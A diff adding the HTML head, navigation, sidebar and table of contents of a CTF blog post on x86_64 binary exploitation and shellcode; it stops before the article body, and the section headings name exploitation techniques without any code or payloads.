@@ -1,0 +1,2134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#ff3e3e" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/safari_pinned_tab.svg" color="#ff3e3e">
+  <meta name="google-site-verification" content="ixJcuHIxOAn36hBu980PgJYFR9hLoktNwfEAAimupCI">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=Italianno:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&family=JetBrains+Mono:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.31/dist/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"vkkkv.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"hide","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"base16/tomorrow-night","dark":"base16/tomorrow-night"},"prism":{"light":"prism-tomorrow","dark":"prism-tomorrow"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":false,"color":"#ff3e3e","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"disqus","storage":true,"lazyload":false,"nav":null,"activeClass":"disqus"},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/config.min.js" defer></script>
+
+    <meta name="description" content="x86_64 Architecture &amp; Stack Byte Order &amp; Packing  Most Linux CTF binaries on x86&#x2F;x86_64 are little-endian: the least significant byte is stored at the lowest address. 0x40123a packed as 64-bit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Binary Exploitation - Architecture, Reversing, Exploitation &amp; Shellcode">
+<meta property="og:url" content="https://vkkkv.github.io/ctf/ctf-03-binary/">
+<meta property="og:site_name" content="Hello Navi">
+<meta property="og:description" content="x86_64 Architecture &amp; Stack Byte Order &amp; Packing  Most Linux CTF binaries on x86&#x2F;x86_64 are little-endian: the least significant byte is stored at the lowest address. 0x40123a packed as 64-bit">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-05-03T07:58:57.000Z">
+<meta property="article:modified_time" content="2026-05-03T07:58:58.645Z">
+<meta property="article:author" content="vkkkv">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="notes">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="shellcode">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://vkkkv.github.io/ctf/ctf-03-binary/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://vkkkv.github.io/ctf/ctf-03-binary/","path":"ctf/ctf-03-binary/","title":"Binary Exploitation - Architecture, Reversing, Exploitation & Shellcode"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Binary Exploitation - Architecture, Reversing, Exploitation & Shellcode | Hello Navi</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2L68NKWCGZ"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-2L68NKWCGZ","only_pageview":false,"measure_protocol_api_secret":null}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/analytics/google-analytics.min.js" defer></script>
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.31/dist/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/pangu@7.2.0/dist/browser/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/utils.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/motion.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/sidebar.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/next-boot.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/pjax.min.js" defer></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.5.0/dist/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/search/local-search.min.js" defer></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdn.jsdelivr.net/npm/mermaid@11.10.1/dist/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/tags/mermaid.min.js" defer></script>
+
+  <script class="next-config" data-name="wavedrom" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.5.0/wavedrom.min.js","integrity":"sha256-INLAoJc6quTNfiMWkGZniYO2cxE8mHpddnLow1m6RFs="}}</script>
+  <script class="next-config" data-name="wavedrom_skin" type="application/json">{"enable":true,"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.5.0/skins/default.js","integrity":"sha256-fduc/Zszk5ezWws2uInY/ALWVmIrmV6VTgXbsYSReFI="}}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/tags/wavedrom.min.js" defer></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/fancybox.min.js" defer></script>
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/math/mathjax.min.js" defer></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha256-44BednzIpUeQJcY8qtLyarFu0UCCTbgmWOvaoehiFQQ=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://vkkkv.github.io/ctf/ctf-03-binary/"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.27.0/source/js/third-party/quicklink.min.js" defer></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><link rel="alternate" href="/atom.xml" title="Hello Navi" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hello Navi" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hello Navi</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Tech, Security & Personal Notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x86_64-architecture-stack"><span class="nav-number">1.</span> <span class="nav-text">x86_64 Architecture &amp; Stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#byte-order-packing"><span class="nav-number">1.1.</span> <span class="nav-text">Byte Order &amp; Packing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#registers"><span class="nav-number">1.2.</span> <span class="nav-text">Registers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#calling-convention-sysv-abi"><span class="nav-number">1.3.</span> <span class="nav-text">Calling Convention (SysV ABI)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rex.w-prefix-0x48"><span class="nav-number">1.4.</span> <span class="nav-text">REX.W Prefix (0x48)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stack-frame-layout"><span class="nav-number">1.5.</span> <span class="nav-text">Stack Frame Layout</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#prologue-epilogue"><span class="nav-number">1.5.1.</span> <span class="nav-text">Prologue &amp; Epilogue</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#memory-management"><span class="nav-number">2.</span> <span class="nav-text">Memory Management</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#segments"><span class="nav-number">2.1.</span> <span class="nav-text">Segments</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#von-neumann-architecture"><span class="nav-number">2.2.</span> <span class="nav-text">Von Neumann Architecture</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#security-mitigations"><span class="nav-number">2.3.</span> <span class="nav-text">Security Mitigations</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec-reading"><span class="nav-number">2.3.1.</span> <span class="nav-text">Checksec Reading</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elf-dynamic-linking"><span class="nav-number">2.4.</span> <span class="nav-text">ELF &amp; Dynamic Linking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#address-translation"><span class="nav-number">2.4.1.</span> <span class="nav-text">Address Translation</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#binary-analysis-tools"><span class="nav-number">3.</span> <span class="nav-text">Binary Analysis &amp; Tools</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cli-tools"><span class="nav-number">3.1.</span> <span class="nav-text">CLI Tools</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse-engineering-workflow"><span class="nav-number">3.2.</span> <span class="nav-text">Reverse Engineering Workflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#radare2-quick-reference"><span class="nav-number">3.3.</span> <span class="nav-text">radare2 Quick Reference</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patching-notes"><span class="nav-number">3.4.</span> <span class="nav-text">Patching Notes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwndbg"><span class="nav-number">3.5.</span> <span class="nav-text">Pwndbg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools"><span class="nav-number">3.6.</span> <span class="nav-text">pwntools</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#de-bruijn-sequence-cyclic"><span class="nav-number">3.6.1.</span> <span class="nav-text">De Bruijn Sequence (Cyclic)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#environment-control"><span class="nav-number">3.7.</span> <span class="nav-text">Environment Control</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#information-disclosure-causes"><span class="nav-number">4.</span> <span class="nav-text">Information Disclosure
+Causes</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#string-termination-problems"><span class="nav-number">4.1.</span> <span class="nav-text">String Termination Problems</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uninitialized-data-stack-frame-reuse"><span class="nav-number">4.2.</span> <span class="nav-text">Uninitialized Data (Stack
+Frame Reuse)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#compiler-backstabbing-dead-store-elimination"><span class="nav-number">4.3.</span> <span class="nav-text">Compiler
+Backstabbing (Dead Store Elimination)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#format-string-leaks"><span class="nav-number">4.4.</span> <span class="nav-text">Format String Leaks</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#memory-corruption-primitives"><span class="nav-number">5.</span> <span class="nav-text">Memory Corruption Primitives</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#stack-buffer-overflow"><span class="nav-number">5.1.</span> <span class="nav-text">Stack Buffer Overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#canary-bypass-patterns"><span class="nav-number">5.2.</span> <span class="nav-text">Canary Bypass Patterns</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#signedness-integer-bugs"><span class="nav-number">5.3.</span> <span class="nav-text">Signedness &amp; Integer Bugs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oob-indexing"><span class="nav-number">5.4.</span> <span class="nav-text">OOB Indexing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#partial-pointer-overwrite"><span class="nav-number">5.5.</span> <span class="nav-text">Partial Pointer Overwrite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#got-overwrite"><span class="nav-number">5.6.</span> <span class="nav-text">GOT Overwrite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#heap-bug-classes"><span class="nav-number">5.7.</span> <span class="nav-text">Heap Bug Classes</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#aslr-bypass-techniques"><span class="nav-number">6.</span> <span class="nav-text">ASLR &amp; Bypass Techniques</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#method-1-memory-leak"><span class="nav-number">6.1.</span> <span class="nav-text">Method 1: Memory Leak</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#method-2-partial-overwrite-yolo"><span class="nav-number">6.2.</span> <span class="nav-text">Method 2: Partial Overwrite
+(YOLO)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#method-3-fork-brute-force"><span class="nav-number">6.3.</span> <span class="nav-text">Method 3: Fork Brute-force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#method-4-ret2libc"><span class="nav-number">6.4.</span> <span class="nav-text">Method 4: ret2libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#method-5-ret2plt-ret2csu"><span class="nav-number">6.5.</span> <span class="nav-text">Method 5: ret2plt &#x2F; ret2csu</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#method-6-srop"><span class="nav-number">6.6.</span> <span class="nav-text">Method 6: SROP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#seccomp-notes"><span class="nav-number">7.</span> <span class="nav-text">Seccomp Notes</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcoding"><span class="nav-number">8.</span> <span class="nav-text">Shellcoding</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#toolchain"><span class="nav-number">8.1.</span> <span class="nav-text">Toolchain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#forbidden-bytes"><span class="nav-number">8.2.</span> <span class="nav-text">Forbidden Bytes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#null-byte-avoidance-techniques"><span class="nav-number">8.2.1.</span> <span class="nav-text">Null Byte Avoidance
+Techniques</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nop-sled-stack-shellcode"><span class="nav-number">8.3.</span> <span class="nav-text">NOP Sled &amp; Stack Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#staged-shellcode"><span class="nav-number">8.4.</span> <span class="nav-text">Staged Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#self-modifying-code-smc"><span class="nav-number">8.5.</span> <span class="nav-text">Self-Modifying Code (SMC)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cet-shstk-ibt"><span class="nav-number">8.6.</span> <span class="nav-text">CET: SHSTK &amp; IBT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference-shellcodes"><span class="nav-number">8.7.</span> <span class="nav-text">Reference Shellcodes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-root-shell-no-rex.w0x48"><span class="nav-number">8.7.1.</span> <span class="nav-text">x64 root shell (No REX.W&#x2F;0x48)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-execvebinsh-22-23-bytes"><span class="nav-number">8.7.2.</span> <span class="nav-text">x64 execve(&quot;&#x2F;bin&#x2F;sh&quot;) (22-23
+bytes)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-cat-flag"><span class="nav-number">8.7.3.</span> <span class="nav-text">x64 cat &#x2F;flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-cat-flag-no-rex.w0x48"><span class="nav-number">8.7.4.</span> <span class="nav-text">x64 cat &#x2F;flag (No REX.W&#x2F;0x48)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x64-cat-flag-no-syscall-opcode"><span class="nav-number">8.7.5.</span> <span class="nav-text">x64 cat &#x2F;flag (No &#39;syscall&#39;
+opcode)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#common-terms"><span class="nav-number">9.</span> <span class="nav-text">Common Terms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#exploit-skeletons"><span class="nav-number">10.</span> <span class="nav-text">Exploit Skeletons</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#localremote-toggle"><span class="nav-number">10.1.</span> <span class="nav-text">Local&#x2F;Remote Toggle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-parsing"><span class="nav-number">10.2.</span> <span class="nav-text">Leak Parsing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flat-payloads"><span class="nav-number">10.3.</span> <span class="nav-text">Flat Payloads</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#python-integer-to-byte-conversion"><span class="nav-number">11.</span> <span class="nav-text">Python: Integer to Byte
+Conversion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#movaps"><span class="nav-number">12.</span> <span class="nav-text">movaps</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x64-rop-%E9%93%BE%E4%B8%AD%E7%9A%84%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="nav-number">12.1.</span> <span class="nav-text">x64 ROP 链中的栈对齐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-x86-%E5%AF%B9%E9%BD%90"><span class="nav-number">12.2.</span> <span class="nav-text">32 位 (x86) 对齐</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="vkkkv"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">vkkkv</p>
+  <div class="site-description" itemprop="description">A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">200</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZLS0tW" title="github → https:&#x2F;&#x2F;github.com&#x2F;VKKKV"><i class="fab fa-github fa-fw"></i></span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+<script>
+(function() {
+  const initAvatarHUD = () => {
+    const img = document.querySelector('.site-author-image');
+    if (!img || img.closest('.avatar-hud-frame')) return;
+
+    const frame = document.createElement('div');
+    frame.className = 'avatar-hud-frame';
+
+    img.replaceWith(frame);
+    frame.appendChild(img);
+
+    // 注入十字准星 (上下左右)
+    ['top', 'bottom', 'left', 'right'].forEach(dir => {
+      const line = document.createElement('div');
+      line.className = `hud-crosshair crosshair-${dir}`;
+      frame.appendChild(line);
+    });
+
+    // 注入外层红色虚线环
+    const outerRing = document.createElement('div');
+    outerRing.className = 'hud-outer-ring';
+    frame.appendChild(outerRing);
+    
+    // 注入内层深色装饰环
+    const innerRing = document.createElement('div');
+    innerRing.className = 'hud-inner-ring';
+    frame.appendChild(innerRing);
+  };
+
+  const initHeader = () => {
+    const brand = document.querySelector('.brand');
+    if (!brand || brand.querySelector('.cyber-underline')) return;
+
+    // 重构标题文字：拆分为两个 span 以便分别着色
+    const title = brand.querySelector('.site-title');
+    if (title) {
+      title.innerHTML = '<span class="text-white">Hello</span><span class="text-red">Navi</span>';
+    }
+
+    // 注入战术下划线 (Cyber Underline)
+    const underline = document.createElement('div');
+    underline.className = 'cyber-underline';
+    underline.innerHTML = `
+      <div class="line-red"></div>
+      <div class="line-dark"></div>
+      <div class="line-dashes">
+        <i></i><i></i><i></i><i></i><i></i>
+      </div>
+    `;
+    brand.appendChild(underline);
+  };
+
+  const initBackToTop = () => {
+    const btn = document.querySelector('.badge-normal');
+    if (!btn || btn.dataset.hooked) return;
+
+    btn.addEventListener('click', () => {
+      window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+      });
+    });
+    btn.dataset.hooked = 'true';
+  };
+
+  const updateTacticalBus = () => {
+    const progressBar = document.getElementById('busProgress');
+    if (!progressBar) return;
+
+    const scrollTop = window.scrollY || document.documentElement.scrollTop;
+    const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    
+    if (scrollHeight <= 0) {
+      progressBar.style.height = '0%';
+      return;
+    }
+
+    const scrollPercent = Math.min(100, Math.max(0, (scrollTop / scrollHeight) * 100));
+    progressBar.style.height = `${scrollPercent}%`;
+  };
+
+  const initAll = () => {
+    initAvatarHUD();
+    initHeader();
+    initBackToTop();
+    
+    // 初始化总线并监听滚动
+    updateTacticalBus();
+    window.removeEventListener('scroll', updateTacticalBus);
+    window.addEventListener('scroll', updateTacticalBus, { passive: true });
+  };
+
+  // 核心修复：确保初始加载时 DOM 完全就绪后再运行
+  if (document.readyState === 'loading') {
+    window.addEventListener('load', initAll);
+  } else {
+    initAll();
+  }
+  
+  document.addEventListener('pjax:success', initAll);
+})();
+</script>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/ctf/ctf-03-binary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
